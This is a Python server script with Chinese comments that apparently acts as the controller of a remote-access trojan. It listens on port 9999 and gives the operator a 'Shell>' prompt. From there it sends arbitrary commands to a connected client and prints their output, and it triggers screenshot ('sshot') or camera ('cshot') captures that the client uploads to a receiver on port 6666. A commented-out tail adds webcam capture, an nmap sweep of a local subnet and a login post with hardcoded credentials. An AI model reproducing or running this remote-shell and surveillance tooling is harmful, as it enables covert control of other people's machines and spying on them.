
#!/usr/bin/env python
# -*-coding:utf-8 -*-
#!/usr/bin/env python
# -*- coding=utf-8 -*-
###服务器端server.py
import socket
import os
import sys
import struct
import _thread
import signal
import threading
#from threading import Thread
from multiprocessing import Process
from time import sleep


host=socket.gethostname()#"127.0.0.1"#socket.gethostname()# 获取本地主机名
def socket_service_image():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # s.bind(('127.0.0.1', 6666))
        s.bind((host, 6666))
        s.listen(10)
    except socket.error as msg:
        print(msg)
        sys.exit(1)

     #print("Wait for Connection.....................")

    while True:
        sock, addr = s.accept()  #addr是一个元组(ip,port)
        deal_image(sock, addr)
def deal_image(sock, addr):
    print("Accept connection from {0}".format(addr))  #查看发送端的ip和端口

    while True:
        fileinfo_size = struct.calcsize('128sq')
        buf = sock.recv(fileinfo_size)   #接收图片名
        if buf:
            filename, filesize = struct.unpack('128sq', buf)
            fn = filename.decode().strip('\x00')
            new_filename = os.path.join('./', 'new_' + fn)  #在服务器端新建图片名（可以不用新建的，直接用原来的也行，只要客户端和服务器不是同一个系统或接收到的图片和原图片不在一个文件夹下）
            recvd_size = 0
            fp = open(new_filename, 'wb')

            while not recvd_size == filesize:
                if filesize - recvd_size > 1024:
                    data = sock.recv(1024)
                    recvd_size += len(data)
                else:
                    data = sock.recv(1024)
                    recvd_size = filesize
                fp.write(data)  #写入图片数据
            fp.close()
        sock.close()
        #os.system("del py.jpg")
        break
'''
def run_with_limited_time(func, args, kwargs, time):

    p =ThreadPoolExecutor(max_workers=2)
    a=p.submit(func,args)
    p.start()
    p.join(time)
    if p.is_alive():
        p.terminate()
        return False

    return True
class TimeoutException(Exception):
    pass
ThreadStop = Thread.Thread__stop

def timelimited(timeout):
    def decorator(function):
        def decorator2(*args,**kwargs):
            class TimeLimited(Thread):
                def __init__(self,_error=None,):
                    Thread.__init__(self)
                    self._error= _error

                def run(self):
                    try:
                        self.result=function(*args,**kwargs)
                    except Exception as e:
                        self._error=str(e)

                def _stop(self):
                    if self.isAlive():
                     ThreadStop(self)

            t= TimeLimited()
            t.start()
            t.join(timeout)

            if isinstance(t._error,TimeoutException):
                t._stop()
                raise TimeoutException('timeout for %s' % (repr(function)))

            if t.isAlive():
                t._stop()
                raise TimeoutException('timeout for %s' % (repr(function)))

            if t._error is None:
                return t.result

        return decorator2
    return decorator

@timelimited(2)
'''
class InputTimeoutError(Exception):
    pass

def interrupted(signum, frame):
    raise InputTimeoutError

def run_client(cmdmsg):
    cmdmsg=clientsocket.recv(2048).decode('utf-8')
    return cmdmsg

def cmdmsg_print(l,k):
    for line in cmdmsg.splitlines():
         print(line)
def rece(x,y):
    return x.recv(1024).decode('utf-8')
if __name__ == '__main__': 
    serversocket = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM)# 创建 socket 对象
    port = 9999
    serversocket.bind((host, port))
    serversocket.listen(5)

    print("Wait for Connection.....................")
    clientsocket,addr = serversocket.accept()   
    print("连接地址: %s" % str(addr))
    while True:
        sleep(0.5)   
        shell=input("Shell>")
        if shell=="sshot":
            #print("hjvhvkhkh")
            _thread.start_new_thread(socket_service_image,())
            clientsocket.send(shell.encode('utf-8'))#发送指令
        if shell=="cshot":
            clientsocket.send(shell.encode('utf-8'))#发送指令
            _thread.start_new_thread(socket_service_image,())
            sleep(3)
        if shell=="!":
            clientsocket.send(shell.encode('utf-8'))#发送指令
            while True:
                sleep(0.2)
                msg=input("cmd>")
                if msg=="exit":
                     break
                clientsocket.send(msg.encode('utf-8'))
                #_thread.start_new_thread(socket_service_image,())
                cmdmsg=""               
                #t1= threading.Thread(run_client,cmdmsg)
                #sleep(2)
                #cmdmsg=clientsocket.recv(2048).decode('utf-8')
                #t1.start()
                #print(cmdmsg)
                #t1.join(10)
                #_thread.start_new_thread(cmdmsg_print,(cmdsmg,None))
                #eventlet.monkey_patch()
                #print("1")
                '''
                with eventlet.Timeout(5):
                    print("2")
                    cmdmsg=clientsocket.recv(2048).decode('utf-8')
                    for line in cmdmsg.splitlines():
                        print(line)
                '''
                signal.signal(signal.SIGALRM, interrupted)
                signal.alarm(10)
                
                try:
                    cmdmsg=clientsocket.recv(2048).decode('utf-8')
                except InputTimeoutError:
                    continue
                signal.alarm(0)  # 读到输入的话重置信号
                for line in cmdmsg.splitlines():
                     print(line)  
            continue
        if shell=="exit":
            clientsocket.close()
            serversocket.close()
            os._exit()
        else:
            clientsocket.send(shell.encode('utf-8'))
            continue
            
                 







'''
import cv2
import numpy as np
# 打开摄像头并灰度化显示
capture = cv2.VideoCapture(0)
while(True):
    # 获取一帧
    ret, frame = capture.read()
    # 将这帧转换为灰度图
    
    cv2.imshow('frame', frame)
    # 如果输入q，则退出
    if cv2.waitKey(1) == ord('q'):
        break

cv2.destroyAllWindows()
import nmap
import requests as rq
class upset:
     def post(url,data=None):
         if not 'http://' in url:
             url="http://"+url  #envelope
         return rq.post(url,headers=headers,data=data)
     def agent(str):
         proxies = {"http": {str},"https": {str},}
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
dataOne = {'Username': 'admin', 'Password': '22'}
re=post("www.bing.com")
for key, value in re.cookies.items():
 print(key + '=' + value)
#print(re.text)

n=nmap.PortScanner()
n.scan("192.168.10.1/24",arguments="-sP")
n.csv()
r=upset.post("www.hack.chat")
print(r.text'''